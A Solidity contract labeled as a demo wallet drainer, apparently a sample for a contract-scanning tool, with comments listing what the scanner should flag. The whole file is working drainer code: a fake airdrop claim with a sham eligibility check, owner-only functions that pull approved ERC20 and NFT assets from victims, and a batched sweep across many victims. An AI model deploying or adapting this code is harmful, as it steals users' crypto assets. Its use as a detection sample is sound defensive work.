// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// DEMO: Wallet drainer. Masquerades as a "ClaimAirdrop" or "FreeMint" dApp
// contract. The user is tricked into calling setApprovalForAll / approve on
// their valuable tokens, then `drain()` pulls everything to the attacker.
//
// ContractLens should flag:
//   - calls token.transferFrom using addresses supplied by the caller
//   - tokens/NFTs pulled to a single "collector" address
//   - multicall-style batched transferFrom loop
//   - misleading function name "claim" that moves *victim* assets
//   - upgradeable collector via owner

interface IERC20 {
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IERC721 {
    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract AirdropClaimer {
    address public owner;
    address public collector;

    event Claimed(address indexed user, uint256 amount);

    constructor() {
        owner = msg.sender;
        collector = msg.sender;
    }

    // Fake "eligibility" check to look legit in the UI
    function isEligible(address) external pure returns (bool) {
        return true;
    }

    // Front-end labels this "Claim Airdrop". It does nothing for the user.
    function claim() external {
        emit Claimed(msg.sender, 0);
    }

    // THE DRAIN: once the victim has approved arbitrary tokens to this
    // contract (via a misleading "verify wallet" popup), owner pulls them all.
    function drainERC20(address token, address victim) external {
        require(msg.sender == owner, "only owner");
        uint256 bal = IERC20(token).balanceOf(victim);
        IERC20(token).transferFrom(victim, collector, bal);
    }

    function drainERC721(address nft, address victim, uint256[] calldata ids) external {
        require(msg.sender == owner, "only owner");
        for (uint256 i = 0; i < ids.length; i++) {
            IERC721(nft).transferFrom(victim, collector, ids[i]);
        }
    }

    // Batched across many victims — the signature drainer pattern
    function sweep(
        address[] calldata tokens,
        address[] calldata victims
    ) external {
        require(msg.sender == owner, "only owner");
        for (uint256 i = 0; i < victims.length; i++) {
            for (uint256 j = 0; j < tokens.length; j++) {
                uint256 bal = IERC20(tokens[j]).balanceOf(victims[i]);
                if (bal > 0) {
                    // Silent failure — move on to the next one
                    try IERC20(tokens[j]).transferFrom(victims[i], collector, bal) {} catch {}
                }
            }
        }
    }

    function setCollector(address c) external {
        require(msg.sender == owner, "only owner");
        collector = c;
    }
}
